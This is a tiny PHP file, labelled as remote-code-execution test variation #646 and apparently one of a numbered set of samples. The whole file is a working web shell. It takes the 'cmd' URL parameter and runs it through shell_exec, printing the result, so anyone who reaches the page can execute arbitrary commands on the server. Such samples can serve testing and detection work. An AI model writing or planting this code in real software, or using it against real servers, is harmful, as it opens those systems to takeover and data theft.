<?php
// RCE test variation #646
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>